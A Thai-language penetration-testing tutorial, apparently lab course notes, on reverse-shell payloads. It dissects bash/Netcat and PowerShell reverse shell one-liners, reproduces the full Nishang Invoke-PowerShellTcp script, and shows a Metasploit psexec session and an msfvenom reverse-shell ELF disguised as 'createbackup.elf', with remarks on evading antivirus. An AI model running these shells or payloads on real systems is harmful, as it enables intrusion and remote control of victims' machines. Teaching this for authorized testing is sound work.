# Introduction to Payloads - ความเข้าใจเชิงลึกเกี่ยวกับ Payload

## Payload คืออะไร?

เคยส่งอีเมลหรือข้อความหาใครไหม? **ข้อความที่เราส่ง**นั่นแหละคือ **payload** ของ packet ที่เดินทางผ่านอินเทอร์เน็ต

### ความหมายของ Payload ในแต่ละบริบท:

**1. ในวงการคอมพิวเตอร์ทั่วไป:**
- Payload = ข้อความหรือข้อมูลที่ต้องการส่ง

**2. ในด้านความปลอดภัยสารสนเทศ:**
- Payload = **คำสั่งและ/หรือโค้ดที่ exploit ช่องโหว่** ใน OS และ/หรือแอปพลิเคชัน

**3. จากมุมมองการป้องกัน:**
- Payload = คำสั่งและ/หรือโค้ดที่**ทำการกระทำที่เป็นอันตราย**

### ตัวอย่างจากความเป็นจริง:
ในหัวข้อ Reverse Shells เราเห็น Windows Defender หยุดการทำงานของ PowerShell payload เพราะมันถูกมองว่าเป็นโค้ดที่เป็นอันตราย

## ทำความเข้าใจกับ Payload

**สิ่งสำคัญที่ต้องจำ:**
- เมื่อเราส่งและรัน payload มันก็เหมือนโปรแกรมทั่วไป
- เรากำลัง**ให้คำสั่งกับคอมพิวเตอร์เป้าหมาย**ว่าต้องทำอะไร
- คำว่า "malware" หรือ "malicious code" ทำให้ฟังดูลึกลับเกินไป
- **ความจริงคือมันก็แค่โค้ดและคำสั่งธรรมดา**

**ความท้าทายสำหรับเรา:**
ลองศึกษาว่าโค้ดและคำสั่งทำงานอย่างไรจริงๆ มาเริ่มกันที่การวิเคราะห์ one-liner ที่เราใช้ไปก่อนหน้านี้

---

## การวิเคราะห์ One-Liners

### 1. Netcat/Bash Reverse Shell One-liner

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

นี่คือ one-liner ที่นิยมใช้บนระบบ Linux เพื่อให้บริการ Bash shell บน network socket โดยใช้ Netcat listener

#### มาแยกวิเคราะห์ทีละส่วน:

**ส่วนที่ 1: ลบไฟล์ /tmp/f**
```bash
rm -f /tmp/f;
```
- ลบไฟล์ `/tmp/f` ถ้ามีอยู่
- `-f` บังคับให้ rm ข้าม/ไม่แสดง error ถ้าไฟล์ไม่มีอยู่
- `;` (เซมิโคลอน) ใช้เพื่อรันคำสั่งตามลำดับ

**ส่วนที่ 2: สร้าง Named Pipe**
```bash
mkfifo /tmp/f;
```
- สร้างไฟล์ **FIFO named pipe** ที่ตำแหน่ง `/tmp/f`
- FIFO = First In First Out (เข้าก่อนออกก่อน)
- `;` รันคำสั่งตามลำดับ

**ส่วนที่ 3: Output Redirection**
```bash
cat /tmp/f |
```
- Concatenate (รวม) ไฟล์ FIFO named pipe `/tmp/f`
- `|` (pipe) เชื่อมต่อ standard output ของ `cat /tmp/f` ไปยัง standard input ของคำสั่งถัดไป

**ส่วนที่ 4: ตั้งค่า Shell Options**
```bash
/bin/bash -i 2>&1 |
```
- ระบุ command language interpreter (Bash)
- `-i` ทำให้ shell เป็นแบบ interactive
- `2>&1` redirect standard error (2) และ standard output (1) ไปยังคำสั่งหลัง pipe

**ส่วนที่ 5: เปิดการเชื่อมต่อด้วย Netcat**
```bash
nc 10.10.14.12 7777 > /tmp/f
```
- ใช้ Netcat เชื่อมต่อไปยังเครื่องโจมตี IP `10.10.14.12` port `7777`
- `>` redirect output ไปยัง `/tmp/f`
- **ผลลัพธ์:** ส่ง Bash shell ไปยัง Netcat listener ที่กำลังรอรับการเชื่อมต่ออยู่

---

### 2. PowerShell One-liner

PowerShell Reverse Shell นี้ซับซ้อนกว่า Linux shell ครับ มาแยกวิเคราะห์ทีละส่วน:

## แยกวิเคราะห์คำสั่ง

```powershell
powershell -nop -c "..."
```

### Flags
- `-nop` = `-NoProfile` - ไม่โหลด PowerShell profile (เร็วขึ้น, หลบ detection)
- `-c` = `-Command` - รันคำสั่งที่ตามหลัง

---

## ส่วนที่ 1: สร้างการเชื่อมต่อ TCP

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
```

**คำอธิบาย:**
- สร้าง TCP client object
- เชื่อมต่อไปที่ **10.10.14.158:443** (Attacker's IP:Port)
- Port 443 (HTTPS) ใช้เพื่อหลบ firewall ที่มักเปิด port นี้ไว้

```powershell
$stream = $client.GetStream();
```

**คำอธิบาย:**
- รับ **NetworkStream** object
- ใช้สำหรับอ่าน/เขียนข้อมูลผ่าน TCP connection
- คล้าย file descriptor ใน Linux

---

## ส่วนที่ 2: สร้าง Buffer

```powershell
[byte[]]$bytes = 0..65535|%{0};
```

**แยกวิเคราะห์:**
```powershell
0..65535        # สร้าง array [0,1,2,...,65535]
|%{0}           # foreach item, replace with 0
[byte[]]        # cast เป็น byte array
```

**ผลลัพธ์:**
- สร้าง **byte array ขนาด 65,536 bytes** (64KB)
- เป็น buffer สำหรับรับข้อมูลจาก attacker
- ทุก element เป็น 0

**ทำไมใช้ 65535?**
- 65535 = 2^16 - 1 (ขนาด maximum TCP packet)
- Buffer ใหญ่พอรับคำสั่งยาวๆ

---

## ส่วนที่ 3: Main Loop - รับและ Execute คำสั่ง

```powershell
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    # ... code ...
}
```

**คำอธิบาย:**
- `$stream.Read($bytes, 0, $bytes.Length)` - อ่านข้อมูลจาก network stream เข้า buffer
  - `$bytes` = buffer ที่จะเก็บข้อมูล
  - `0` = เริ่มเขียนที่ index 0
  - `$bytes.Length` = อ่านได้สูงสุดเท่าไร
  - Return = จำนวน bytes ที่อ่านได้ (เก็บใน `$i`)
- `-ne 0` = loop จนกว่า connection จะปิด (อ่านได้ 0 bytes)

---

### ขั้นที่ 3.1: แปลง Bytes เป็น String

```powershell
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
```

**คำอธิบาย:**
- สร้าง ASCII encoder object
- แปลง byte array → string
- อ่าน `$i` bytes (จำนวนที่อ่านได้จริง)
- `$data` = คำสั่งที่ attacker ส่งมา (เช่น "whoami")

---

### ขั้นที่ 3.2: Execute คำสั่ง

```powershell
$sendback = (iex $data 2>&1 | Out-String );
```

**แยกส่วน:**

**`iex $data`**
- `iex` = `Invoke-Expression`
- รันคำสั่ง PowerShell ที่อยู่ใน `$data`
- เหมือน `eval()` ใน Python

**`2>&1`**
- Redirect error stream (2) → success stream (1)
- ทำให้ error messages แสดงด้วย

**`| Out-String`**
- แปลง output objects → string
- PowerShell objects ต้องแปลงเป็น text ก่อนส่ง

**ผลลัพธ์:**
- `$sendback` = output ของคำสั่งที่รัน

---

### ขั้นที่ 3.3: สร้าง Prompt

```powershell
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
```

**คำอธิบาย:**
- `(pwd).Path` = Current directory path
- สร้าง prompt เหมือน terminal จริง
- ตัวอย่าง: `PS C:\Users\victim> `

**ผลลัพธ์:**
```
[command output]
PS C:\Users\victim> 
```

---

### ขั้นที่ 3.4: ส่ง Output กลับ

```powershell
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
```

**คำอธิบาย:**
- แปลง string → byte array (ASCII encoding)
- Network stream ต้องการ bytes ไม่ใช่ string

```powershell
$stream.Write($sendbyte,0,$sendbyte.Length);
```

**คำอธิบาย:**
- เขียน bytes ไปยัง network stream
- ส่งกลับไปหา attacker
- `0` = เริ่มอ่านจาก index 0
- `$sendbyte.Length` = ส่งทั้งหมด

```powershell
$stream.Flush();
```

**คำอธิบาย:**
- Flush buffer ให้ส่งข้อมูลทันที
- ไม่รอให้ buffer เต็มก่อน

---

### ขั้นที่ 3.5: ปิดการเชื่อมต่อ

```powershell
$client.Close()
```

**คำอธิบาย:**
- ปิด TCP connection
- ทำงานเมื่อ loop จบ (connection ขาด)

---

## Flow Diagram

```
┌─────────────────────────────────────────────────────┐
│              Victim Machine (PowerShell)             │
│                                                       │
│  1. เชื่อมต่อไปหา Attacker (10.10.14.158:443)       │
│     TCPClient.Connect()                              │
│          │                                            │
│          ▼                                            │
│  2. Loop: รอรับคำสั่ง                                │
│     ┌─────────────────────────────┐                 │
│     │ $stream.Read() → $bytes     │◄────────┐       │
│     └──────────┬──────────────────┘         │       │
│                ▼                             │       │
│     3. แปลง bytes → string                  │       │
│        GetString($bytes)                     │       │
│                ▼                             │       │
│     4. Execute คำสั่ง                        │       │
│        iex $data                             │       │
│                ▼                             │       │
│     5. แปลง output → string                 │       │
│        Out-String                            │       │
│                ▼                             │       │
│     6. เพิ่ม prompt                          │       │
│        + 'PS ' + (pwd).Path + '> '          │       │
│                ▼                             │       │
│     7. แปลง string → bytes                  │       │
│        GetBytes()                            │       │
│                ▼                             │       │
│     8. ส่งกลับไปหา Attacker                 │       │
│        $stream.Write()                       │       │
│        $stream.Flush()                       │       │
│                │                             │       │
│                └─────────────────────────────┘       │
│                                                       │
└───────────────────────────────────────────────────────┘
                       ▲         │
                       │         │
        Commands       │         │  Results
                       │         ▼
┌───────────────────────────────────────────────────────┐
│            Attacker Machine (nc listener)             │
│                                                       │
│  nc -lvnp 443                                         │
│  PS C:\Users\victim> whoami                          │
│  victim\user                                          │
│  PS C:\Users\victim>                                 │
└───────────────────────────────────────────────────────┘
```



## Timeline ของคำสั่งหนึ่ง

**Attacker พิมพ์: `Get-Process`**

```
Time  | Action
------|---------------------------------------------------------
T=0   | Attacker: พิมพ์ "Get-Process\n"
      | nc ส่ง → network
      |
T=1   | Victim: $stream.Read() รับ bytes
      | $data = "Get-Process\n"
      |
T=2   | Victim: iex "Get-Process\n"
      | PowerShell execute คำสั่ง
      | $sendback = [list of processes]
      |
T=3   | Victim: สร้าง $sendback2
      | = [list] + "PS C:\Users\victim> "
      |
T=4   | Victim: แปลง → bytes
      | $stream.Write() → $stream.Flush()
      | ส่ง → network
      |
T=5   | Attacker: nc แสดงผล
      | Handles  NPM(K)    PM(K)      WS(K) ...
      | PS C:\Users\victim>
```


---

**Reverse Shell นี้:**
1. ✅ เชื่อมต่อจาก Victim → Attacker (หลบ inbound firewall)
2. ✅ ใช้ port 443 (ดูเหมือน HTTPS traffic)
3. ✅ Interactive shell (รันคำสั่งได้เรื่อยๆ)
4. ✅ Error handling (2>&1)
5. ✅ Prompt แสดง current directory

**จุดอ่อน:**
- ต้องมี PowerShell (มีใน Windows ทุกเวอร์ชันตั้งแต่ 7 ขึ้นไป)
- ตรวจจับได้จาก process/network monitoring
- Blocked ได้จาก Antivirus/EDR

มีส่วนไหนที่ต้องการอธิบายเพิ่มเติมไหมครับ? 😊

---

## PowerShell Script Format

One-liner ที่เราวิเคราะห์มาสามารถรันในรูปแบบ **PowerShell script (`.ps1`)** ได้เช่นกัน

### ตัวอย่าง: Nishang Project

https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

ดูตัวอย่าง source code จาก **nishang project** - script ชื่อ `Invoke-PowerShellTcp`:

**ความสามารถของ script นี้:**
- **Reverse Shell:** เชื่อมต่อไปยัง Netcat listener บนเครื่องโจมตี
- **Bind Shell:** รอรับการเชื่อมต่อจาก Netcat บน port ที่กำหนด
- รองรับทั้ง **IPv4 และ IPv6**

**ตัวอย่างการใช้งาน:**

1. **Reverse Shell:**
```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
```

2. **Bind Shell:**
```powershell
Invoke-PowerShellTcp -Bind -Port 4444
```

3. **Reverse Shell ผ่าน IPv6:**
```powershell
Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
```

**Script:**

```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

```

---

## Payloads มีหลายรูปแบบ

### ข้อควรเข้าใจ:

**1. ทำไมต้องเข้าใจ Payload?**
- ช่วยเข้าใจว่า**ทำไม AV ถึงบล็อกเรา**
- ให้แนวคิดว่า**ต้องแก้โค้ดอย่างไรเพื่อหลบหลีกการตรวจจับ**
- จะได้เรียนรู้เพิ่มเติมในโมดูลนี้

**2. ปัจจัยที่กำหนด Payload ที่ใช้:**
- **OS** ของเป้าหมาย
- **Shell interpreter languages** ที่มีอยู่
- **Programming languages** ที่สามารถใช้ได้

**3. ประเภทของ Payload:**

**Manual Payloads:**
- One-liners ที่ต้อง copy & paste
- Deploy ด้วยมือ
- เหมือนที่เราศึกษามาในส่วนนี้

**Automated Payloads:**
- สร้างโดย automated attack frameworks
- Deploy เป็น pre-packaged/automated attack
- **ตัวอย่าง:** Metasploit-framework (จะเรียนรู้ในหัวข้อถัดไป)

---
# Automating Payloads & Delivery with Metasploit

## Metasploit คืออะไร?

**Metasploit** คือ **automated attack framework** ที่พัฒนาโดย Rapid7 ซึ่งช่วยทำให้กระบวนการ exploit ช่องโหว่ง่ายขึ้นผ่านการใช้ **pre-built modules** ที่มี:
- ตัวเลือกที่ใช้งานง่าย
- สามารถ exploit ช่องโหว่
- ส่ง payload เพื่อให้ได้ shell บนระบบที่มีช่องโหว่

### ข้อควรระวัง:

**เรื่องความง่ายในการใช้งาน:**
- Metasploit ทำให้การ exploit ง่ายมาก
- บางองค์กรฝึกอบรมจำกัดการใช้งานในการสอบ
- Hack The Box สนับสนุนให้ทดลองใช้จนเข้าใจพื้นฐานอย่างถ่องแท้

**ความรับผิดชอบของเรา:**
- องค์กรส่วนใหญ่ไม่จำกัดเครื่องมือที่ใช้
- แต่คาดหวังให้เรา**รู้ว่าเรากำลังทำอะไร**
- **ต้องเข้าใจผลกระทบของเครื่องมือที่ใช้**
- การไม่เข้าใจอาจทำลายระบบในการทำ pentest หรือ audit จริง

### เวอร์ชันของ Metasploit:

**1. Community Edition:**
- ใช้ฟรี
- จะใช้เวอร์ชันนี้ในโมดูล

**2. Metasploit Pro:**
- เวอร์ชันแบบเสียเงิน
- บริษัทความปลอดภัยใช้ทำ penetration tests, security audits, social engineering campaigns
- [ดูตารางเปรียบเทียบได้ที่เว็บไซต์]

---

## เริ่มต้นใช้งาน Metasploit

### การเปิด Metasploit Framework Console

```bash
sudo msfconsole
```

**Output ที่ได้:**
```
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt

       =[ metasploit v6.0.44-dev                          ]
+ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

msf6 > 
```

### ตัวเลขสำคัญ:

| ประเภท | จำนวน | คำอธิบาย |
|--------|-------|----------|
| **Exploits** | 2131 | โมดูลสำหรับ exploit ช่องโหว่ |
| **Payloads** | 592 | Payload ที่สามารถใช้ได้ |
| **Auxiliary** | 1139 | โมดูลช่วยเหลือ (scan, enumerate) |
| **Post** | 363 | โมดูลหลัง exploitation |
| **Encoders** | 45 | สำหรับ encode payload |
| **Nops** | 10 | No-operation instructions |
| **Evasion** | 8 | โมดูลหลบหลีกการตรวจจับ |

**หมายเหตุ:** ตัวเลขเหล่านี้อาจเปลี่ยนไปตามการอัปเดต

---

## กระบวนการใช้งาน Metasploit

### ขั้นตอนที่ 1: Enumeration ด้วย Nmap

ก่อนใช้ Metasploit ต้อง scan เป้าหมายก่อน:

```bash
nmap -sC -sV -Pn 10.129.164.25
```

**ผลลัพธ์:**
```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

**การวิเคราะห์:**
- เห็น port มาตรฐานของ Windows
- **Port 445:** SMB service - เป็น attack vector ที่น่าสนใจ
- การ scan ช่วยให้รู้ว่า OS เป้าหมายคืออะไร

### ขั้นตอนที่ 2: ค้นหา Module ใน Metasploit

```bash
msf6 > search smb
```

**ผลลัพธ์:**
```
#    Name                                    Disclosure Date    Rank       Description
41   auxiliary/scanner/smb/smb_ms17_010                        normal     MS17-010 SMB RCE Detection
56   exploit/windows/smb/psexec             1999-01-01         manual     Microsoft Windows Authenticated User Code Execution
60   exploit/windows/smb/ms10_046...        2010-07-16         excellent  Microsoft Windows Shell LNK Code Execution
```

---

## ทำความเข้าใจโครงสร้าง Module

### ตัวอย่าง: Module หมายเลข 56

```
56   exploit/windows/smb/psexec
```

**การแยกวิเคราะห์:**

| ส่วน | ความหมาย |
|------|----------|
| **56** | หมายเลข module ในตารางผลค้นหา (ใช้สำหรับเลือก module: `use 56`) |
| **exploit/** | ประเภท module = exploit module (มี payload สำหรับสร้าง shell session) |
| **windows/** | แพลตฟอร์มเป้าหมาย = Windows |
| **smb/** | บริการที่จะโจมตี = SMB |
| **psexec** | เครื่องมือที่จะอัปโหลดไปยังระบบเป้าหมาย |

**หมายเหตุ:** หมายเลข module อาจเปลี่ยนไปตามการค้นหา ไม่ควรจดจำเป็นค่าคงที่

---

## การใช้งาน Module: PsExec

### เลือก Module

```bash
msf6 > use 56
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) >
```

**การเปลี่ยนแปลง Prompt:**
- แสดง `exploit(windows/smb/psexec)` = กำลังใช้ exploit นี้
- Payload เริ่มต้น: `windows/meterpreter/reverse_tcp`

### ดู Options ของ Module

```bash
msf6 exploit(windows/smb/psexec) > options
```

**Module Options:**

| Option | Current Setting | Required | Description |
|--------|----------------|----------|-------------|
| **RHOSTS** | - | yes | เป้าหมาย (IP address, CIDR, หรือ hosts file) |
| **RPORT** | 445 | yes | SMB service port |
| **SHARE** | - | no | Share ที่จะเชื่อมต่อ (ADMIN$, C$, ฯลฯ) |
| **SMBDomain** | . | no | Windows domain สำหรับ authentication |
| **SMBPass** | - | no | Password |
| **SMBUser** | - | no | Username |

**Payload Options (Meterpreter):**

| Option | Current Setting | Required | Description |
|--------|----------------|----------|-------------|
| **EXITFUNC** | thread | yes | วิธีออกจาก payload |
| **LHOST** | 68.183.42.102 | yes | IP ของเครื่องโจมตีที่รอรับการเชื่อมต่อ |
| **LPORT** | 4444 | yes | Port ที่รอรับการเชื่อมต่อ |

### Meterpreter คืออะไร?

**Meterpreter** = Payload พิเศษที่ให้ความสามารถมากกว่า raw TCP reverse shell

**คุณสมบัติ:**
- ใช้ **in-memory DLL injection** = แอบแฝงมากขึ้น
- สร้าง communication channel ระหว่างเครื่องโจมตีกับเป้าหมาย
- เป็น default payload ใน Metasploit

**ความสามารถ:**
- อัปโหลด/ดาวน์โหลดไฟล์
- รันคำสั่งระบบ
- ใช้ keylogger
- สร้าง/เริ่ม/หยุด services
- จัดการ processes
- และอื่นๆ อีกมาก

---

## การตั้งค่าและรัน Exploit

### ตั้งค่า Options

```bash
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71

msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$

msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!

msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student

msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

**การตั้งค่าเหล่านี้:**
- **RHOSTS:** IP ของเป้าหมาย
- **SHARE:** ใช้ administrative share (ADMIN$)
- **SMBPass & SMBUser:** credentials สำหรับเข้าถึง
- **LHOST:** IP ของเครื่องโจมตี (VPN tunnel IP หรือ interface ID)

### รัน Exploit

```bash
msf6 exploit(windows/smb/psexec) > exploit
```

**Output ที่ได้:**
```
[*] Started reverse TCP handler on 10.10.14.222:4444 
[*] 10.129.180.71:445 - Connecting to the server...
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[+] 10.129.180.71:445 - Service start timed out, OK if running a command...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675)

meterpreter > 
```

### การวิเคราะห์ Output:

**ขั้นตอนการทำงาน:**
1. ✅ เริ่ม reverse TCP handler
2. ✅ เชื่อมต่อกับ server
3. ✅ ตรวจสอบสิทธิ์ด้วย credentials
4. ✅ เลือก PowerShell target
5. ✅ รัน payload
6. ✅ ส่ง stage (175,174 bytes)
7. ✅ **สำเร็จ!** ได้ Meterpreter session

---

## การใช้งาน Meterpreter Shell

### คำสั่งพื้นฐาน

```bash
meterpreter > ?
```
- แสดงรายการคำสั่งที่ใช้ได้ทั้งหมด

### Drop ไปยัง System-Level Shell

```bash
meterpreter > shell
Process 604 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

**เหตุผลที่ต้อง drop ไปยัง system shell:**
- Meterpreter มีข้อจำกัดบางอย่าง
- System shell ให้เข้าถึงคำสั่งระบบทั้งหมด
- คล้ายกับ command language interpreters อื่นๆ (Bash, PowerShell, ksh)

---

## การทำงานของ PsExec Module

ตามเอกสาร Rapid7 Module Documentation:

**โมดูลนี้:**
- ใช้ **username และ password ที่ถูกต้องของ administrator** (หรือ password hash)
- รัน arbitrary payload บนเป้าหมาย
- คล้ายกับ **"psexec" utility** ของ SysInternals
- **สามารถลบร่องรอยตัวเองได้**
- สร้าง service ด้วยชื่อและคำอธิบายแบบสุ่ม

---
# Crafting Payloads with MSFvenom

## ข้อจำกัดของ Metasploit และทางออก

### ปัญหาที่พบ:

**การใช้ Metasploit แบบอัตโนมัติต้องการ:**
- เข้าถึงเครื่องเป้าหมายผ่านเครือข่าย
- อยู่ในเครือข่ายภายใน (internal network)
- มี network routes ไปยังเครือข่ายที่มีเป้าหมาย

**สถานการณ์ที่มีปัญหา:**
เมื่อ**ไม่มีการเข้าถึงเครือข่ายโดยตรง**ไปยังเครื่องเป้าหมาย

### วิธีแก้ปัญหา: MSFvenom

**MSFvenom** = เครื่องมือสร้าง payload ที่:
- สร้าง payload แยกจาก Metasploit
- ส่งผ่านช่องทางอื่น (email, social engineering, ฯลฯ)
- **Encrypt & Encode payload** เพื่อหลบหลีก anti-virus

---

## การใช้งาน MSFvenom

### ดูรายการ Payloads ทั้งหมด

```bash
msfvenom -l payloads
```

**Output:**
```
Framework Payloads (592 total) [--payload <value>]

Name                                                Description
----                                                -----------
linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to attacker
linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
linux/zarch/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
windows/dllinject/reverse_tcp                       Inject a DLL via a reflective loader. Connect back to attacker
windows/meterpreter/reverse_tcp                     Meterpreter payload (staged)
windows/meterpreter_reverse_tcp                     Meterpreter payload (stageless)
```

### สิ่งที่สังเกตได้:

**1. Naming Convention:**
- เริ่มต้นด้วย **OS ของเป้าหมาย** (Linux, Windows, MacOS, mainframe, ฯลฯ)
- แสดงประเภท: **(staged)** หรือ **(stageless)**

**2. Architecture:**
- x86, x64, ARM, ฯลฯ

**3. Shell Type:**
- shell, meterpreter, ฯลฯ

**4. Connection Type:**
- reverse_tcp, bind_tcp, reverse_http, ฯลฯ

---

## Staged vs. Stageless Payloads

### Staged Payloads (มีขั้นตอน)

**ตัวอย่าง:** `linux/x86/shell/reverse_tcp`

**การทำงาน:**
1. ส่ง **stage แรก (ขนาดเล็ก)** ไปยังเป้าหมาย
2. Stage แรกถูกรันบนเป้าหมาย
3. **Call back** ไปยังเครื่องโจมตีเพื่อดาวน์โหลด payload ที่เหลือ
4. รัน shellcode เพื่อสร้าง reverse shell

**ข้อดี:**
- ส่ง payload ขนาดใหญ่แบบแบ่งส่วนได้
- ยืดหยุ่นในการส่ง component เพิ่มเติม

**ข้อเสีย:**
- Stage กิน memory space
- ต้องการ bandwidth มากกว่า
- อาจไม่เสถียรในสภาพแวดล้อมที่มี latency สูง
- สร้าง network traffic มากขึ้น (ง่ายต่อการตรวจจับ)

### Stageless Payloads (ไม่มีขั้นตอน)

**ตัวอย่าง:** `linux/zarch/meterpreter_reverse_tcp`

**การทำงาน:**
1. ส่ง **payload ทั้งหมด** ไปพร้อมกันครั้งเดียว
2. ไม่มีการ call back เพื่อดาวน์โหลดเพิ่มเติม
3. รันทันทีเมื่อได้รับ

**ข้อดี:**
- เหมาะสำหรับสภาพแวดล้อมที่ bandwidth จำกัด
- เสถียรกว่าใน environment ที่มี latency
- **ดีกว่าสำหรับการหลบหลีก (evasion)**
- network traffic น้อยกว่า
- เหมาะกับ social engineering

**ข้อเสีย:**
- ขนาดไฟล์ใหญ่กว่า

---

## การระบุชนิด Payload จากชื่อ

### วิธีดูจากชื่อ:

**Staged Payload:**
```
linux/x86/shell/reverse_tcp
         ↑     ↑     ↑
      arch  stage  stage
```
- แต่ละ `/` แทนขั้นตอน (stage)
- `/shell/` = stage หนึ่ง
- `/reverse_tcp` = อีก stage หนึ่ง

**Stageless Payload:**
```
linux/zarch/meterpreter_reverse_tcp
         ↑            ↑
      arch    shell+connection รวมกัน
```
- ทุกอย่างอยู่ในฟังก์ชันเดียว
- `meterpreter_reverse_tcp` = shell และ network communication รวมกัน

### ตัวอย่างเปรียบเทียบ:

| Staged | Stageless |
|--------|-----------|
| `windows/meterpreter/reverse_tcp` | `windows/meterpreter_reverse_tcp` |
| มี `/` แยก stage | ไม่มี `/` แยก - ใช้ `_` |

**หมายเหตุ:** ถ้าไม่แน่ใจจากชื่อ ให้ดู description ของ payload จะบอกว่า staged หรือ stageless

---

## สร้าง Stageless Payload สำหรับ Linux

### สร้าง Payload

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

**Output:**
```
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

